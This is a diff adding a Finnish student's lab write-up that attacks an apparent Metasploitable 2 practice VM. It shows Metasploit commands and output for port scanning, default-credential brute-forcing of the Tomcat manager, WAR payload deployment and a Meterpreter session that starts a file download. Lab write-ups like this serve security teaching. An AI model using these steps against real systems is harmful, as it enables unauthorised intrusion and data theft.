@@ -134,6 +134,335 @@ Useissa ohjeissa myös käytetään Windows kohteita, joita minulla ei ole käyt
 
 Yritän vielä myöhemmin jatkaa.  
 
+**Jatkoa 13.5.2021**
+
+Olin jo aiemmin skannannut Metasploitable 2 koneen: 
+```
+msf6 > services 172.28.128.6
+Services
+========
+
+host          port   proto  name         state  info
+----          ----   -----  ----         -----  ----
+172.28.128.6  21     tcp    ftp          open   vsftpd 2.3.4
+172.28.128.6  22     tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
+172.28.128.6  23     tcp    telnet       open   Linux telnetd
+172.28.128.6  25     tcp    smtp         open   Postfix smtpd
+172.28.128.6  53     tcp    domain       open   ISC BIND 9.4.2
+172.28.128.6  80     tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
+172.28.128.6  111    tcp    rpcbind      open   2 RPC #100000
+172.28.128.6  139    tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
+172.28.128.6  445    tcp    netbios-ssn  open   Samba smbd 3.0.20-Debian workgroup: WORKGROUP
+172.28.128.6  512    tcp    exec         open   netkit-rsh rexecd
+172.28.128.6  513    tcp    login        open   OpenBSD or Solaris rlogind
+172.28.128.6  514    tcp    shell        open   Netkit rshd
+172.28.128.6  1099   tcp    java-rmi     open   GNU Classpath grmiregistry
+172.28.128.6  1524   tcp    bindshell    open   Metasploitable root shell
+172.28.128.6  2049   tcp    nfs          open   2-4 RPC #100003
+172.28.128.6  2121   tcp    ftp          open   ProFTPD 1.3.1
+172.28.128.6  3306   tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
+172.28.128.6  3632   tcp    distccd      open   distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
+172.28.128.6  5432   tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
+172.28.128.6  5900   tcp    vnc          open   VNC protocol 3.3
+172.28.128.6  6000   tcp    x11          open   access denied
+172.28.128.6  6667   tcp    irc          open   UnrealIRCd
+172.28.128.6  6697   tcp    irc          open   UnrealIRCd
+172.28.128.6  8009   tcp    ajp13        open   Apache Jserv Protocol v1.3
+172.28.128.6  8180   tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
+172.28.128.6  8787   tcp    drb          open   Ruby DRb RMI Ruby 1.8; path /usr/lib/ruby/1.8/drb
+172.28.128.6  33434  tcp    mountd       open   1-3 RPC #100005
+172.28.128.6  40148  tcp    nlockmgr     open   1-4 RPC #100021
+172.28.128.6  44051  tcp    status       open   1 RPC #100024
+172.28.128.6  46567  tcp    java-rmi     open   GNU Classpath grmiregistry
+```
+
+Portissa 8180 on käytössä Apache Tomcat ja kyseisen portin versio aggressivinen skannaus (-Av) palautti seuraavaa:
+```
+PORT     STATE SERVICE VERSION
+8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/5.5
+```
+
+Tarkisin vielä selaimelta, mitä sivulta löytyy:
+
+<img src='Screenshots/Lesson05TomcatFront.png'>  
+
+Manager ja adminkonsolit olivat salasanan takana:
+
+<img src='Screenshots/Lesson05TomcatAdmin.png'> 
+<img src='Screenshots/Lesson05TomcatManager.png'>  
+
+Katsoin, mitä metasploitista löytyy tämän palvelun osalta:
+```
+msf6 > search Apache Tomcat 5.5
+
+Matching Modules
+================
+
+   #  Name                                                Disclosure Date  Rank       Check  Description
+   -  ----                                                ---------------  ----       -----  -----------
+   0  auxiliary/admin/http/tomcat_ghostcat                2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   1  exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   2  exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   3  auxiliary/dos/http/apache_tomcat_transfer_encoding  2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   4  auxiliary/scanner/http/tomcat_enum                                   normal     No     Apache Tomcat User Enumeration
+   5  auxiliary/admin/http/tomcat_administration                           normal     No     Tomcat Administration Tool Default Access
+   6  auxiliary/admin/http/tomcat_utf8_traversal          2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   7  auxiliary/admin/http/trendmicro_dlp_traversal       2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+
+
+Interact with a module by name or index. For example info 7, use 7 or use auxiliary/admin/http/trendmicro_dlp_traversal
+
+```
+
+Valitsin listan toisen vaihtoehdon, joka näyttää hyödyntävän heikkoutta manager konsolissa koodin suorittamiseksi:
+```
+msf6 > use 1
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_deploy) > options
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/U
+                                            sing-Metasploit
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+
+Optioita katsoessa huomasin heti, että seuraavat pitää ainakin määrittää:
+- RHOSTS 172.28.128.6
+- RPORT vaihtaa 8180
+- PAYLOAD
+
+Mahdollisesti muutakin, mutta kokeilin näillä ja päädyin virheeseen payloadissa, joten vaihdoin sen toiseen. Lisää virheitä, kuten automaattinen kohteen valinta ei onnistu:
+```
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 172.28.128.6
+RHOSTS => 172.28.128.6
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+msf6 exploit(multi/http/tomcat_mgr_deploy) > run
+
+[-] Exploit failed: linux/x86/meterpreter/bind_ipv6_tcp is not a compatible payload.
+[*] Exploit completed, but no session was created.
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                     Disclosure Date  Rank    Check  Description
+   -   ----                                     ---------------  ----    -----  -----------
+   0   payload/generic/custom                                    normal  No     Custom Payload
+   1   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
+   2   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
+   3   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
+   4   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
+   5   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
+   6   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
+   7   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
+   8   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+   9   payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
+   10  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
+   11  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
+   12  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
+   13  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+   14  payload/multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set PAYLOAD 7
+PAYLOAD => java/meterpreter/reverse_http
+msf6 exploit(multi/http/tomcat_mgr_deploy) > run
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started HTTP reverse handler on http://127.0.0.1:4444
+[*] Attempting to automatically select a target...
+[-] Failed: Error requesting /manager/serverinfo
+[-] Exploit aborted due to failure: no-target: Unable to automatically select a target
+[*] Exploit completed, but no session was created.
+```
+ 
+Valitsin kohteen ja yritin uudelleen, mutta päädyin taas payload incompatibility virheeseen:  
+```
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   Java Universal
+   2   Windows Universal
+   3   Linux x86
+
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set TARGET 3
+TARGET => 3
+msf6 exploit(multi/http/tomcat_mgr_deploy) > run
+
+[-] Exploit failed: java/meterpreter/reverse_http is not a compatible payload.
+```
+
+Uusi payload sisään:
+```
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show payloads
+## Tässä todella iso lista payloadeja, joten karsin turhat pois
+   8   payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set PAYLOAD 8
+PAYLOAD => linux/x86/meterpreter/bind_ipv6_tcp
+msf6 exploit(multi/http/tomcat_mgr_deploy) > run
+
+[*] Using manually select target "Linux x86"
+[*] Uploading 1597 bytes as 49xE0bHSepusvd0hnObs2bDD2.war ...
+[!] Warning: The web site asked for authentication: Basic realm="Tomcat Manager Application"
+[-] Exploit aborted due to failure: unknown: Upload failed on /manager/deploy?path=/49xE0bHSepusvd0hnObs2bDD2 [401 Unauthorized]
+[*] Exploit completed, but no session was created.
+
+```
+Eli autentikointivirhettä. Tässä kohtaa minuun iski pieni hämmennys kuinka saada käyttäjätunnukset. Löysin pienen etsinnän jälkeen Kalin wordlists osastosta seuraavan:
+
+**Jatkoa 14.5.20211**
+
+```
+$ ls /usr/share/wordlists/metasploit/ | grep tomcat                                                           
+tomcat_mgr_default_pass.txt
+tomcat_mgr_default_userpass.txt
+tomcat_mgr_default_users.txt
+```
+
+Eli todennäköisimmin jokin keino on jolla voin automatisoida hyökkäyksen. Jouduin lopulta etsimään tietoa hakukoneesta ja päädyin walkthrough sivulle, jota selasin vain sen verran, että sivulla mainittiin Metasploitista löytyvän tähän sopiva hyökkäys (https://medium.com/@SumanNathani/exploiting-metasploitable-2-using-tomcat-vulnerability-and-defacing-default-page-f6d7d55b748e).  
+
+Lähdin siis hakemaan:
+```
+msf6 > search tomcat
+23  auxiliary/scanner/http/tomcat_mgr_login     normal     No     Tomcat Application Manager Login Utility
+msf6 > use 23
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > options
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                   Required  Description
+   ----              ---------------                   --------  -----------
+   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current datab
+                                                                 ase
+   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                             no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                              no        Skip existing credentials stored in the current database
+                                                                 (Accepted: none, user, user&realm)
+   PASSWORD                                            no        The HTTP password to specify for authentication
+   PASS_FILE         /usr/share/metasploit-framework/  no        File containing passwords, one per line
+                     data/wordlists/tomcat_mgr_defaul
+                     t_pass.txt
+   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][.
+                                                                 ..]
+   RHOSTS                                              yes       The target host(s), see https://github.com/rapid7/metaspl
+                                                                 oit-framework/wiki/Using-Metasploit
+   RPORT             8080                              yes       The target port (TCP)
+   SSL               false                             no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                     yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                 yes       The number of concurrent threads (max one per host)
+   USERNAME                                            no        The HTTP username to specify for authentication
+   USERPASS_FILE     /usr/share/metasploit-framework/  no        File containing users and passwords separated by space, o
+                     data/wordlists/tomcat_mgr_defaul            ne pair per line
+                     t_userpass.txt
+   USER_AS_PASS      false                             no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/  no        File containing users, one per line
+                     data/wordlists/tomcat_mgr_defaul
+                     t_users.txt
+   VERBOSE           true                              yes       Whether to print output for all attempts
+   VHOST                                               no        HTTP server virtual host
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 172.28.128.4
+RHOSTS => 172.28.128.4
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
+RPORT => 8180
+```
+
+Kun kohde ja portti oli asetettu oikeaksi oli aika hyökätä ja tosiaan yksi yhdistelmä tuotti tulosta:
+```
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+[+] 172.28.128.4:8180 - Login Successful: tomcat:tomcat
+```
+
+Nyt voidaan siis palata edellisen hyökkäyksen pariin (en käy vaiheita uudelleen läpi, joten tässä options ja run komennot):
+```
+msf6 exploit(multi/http/tomcat_mgr_deploy) > options
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword  tomcat           no        The password for the specified username
+   HttpUsername  tomcat           no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        172.28.128.4     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us
+                                            ing-Metasploit
+   RPORT         8180             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/bind_ipv6_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST  172.28.128.4     no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   3   Linux x86
+msf6 exploit(multi/http/tomcat_mgr_deploy) > run
+
+[*] Using manually select target "Linux x86"
+[*] Uploading 1642 bytes as AAgrp0hSoPt6Iaj67r7WL.war ...
+[*] Executing /AAgrp0hSoPt6Iaj67r7WL/KYg5WHAytt7qQQBhunFwxjM.jsp...
+[*] Undeploying AAgrp0hSoPt6Iaj67r7WL ...
+[*] Started bind TCP handler against 172.28.128.4:4444
+[*] Sending stage (989032 bytes) to 172.28.128.4
+[*] Meterpreter session 1 opened (172.28.128.3:35329 -> 172.28.128.4:4444 ) at 2022-05-14 10:18:11 +0300
+
+meterpreter > help
+meterpreter > getuid
+Server username: tomcat55
+meterpreter > sysinfo
+Computer     : metasploitable.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > download /home/msfadmin/vulnerable/mysql-ssl/
+```
+
+
+
+
 ## ~~e) Vapaaehtoinen: ExploitDB offline. Murtaudu johonkin harjoitusmaaliin käyttäen hyökkäystä, jonka etsit 'searchsploit' työkalulla. Valitse sellainen hyökkäys, joka ei tule suoraan Metasploitin mukana.~~
 
 ## ~~Vapaaehtoinen: NSA was here. Kokeile Ghidraa. Voit esimerkiksi kääntää jonkin oikein yksinkertaisen ohjelmasi binääriksi, ja katsoa miltä se näyttää.~~
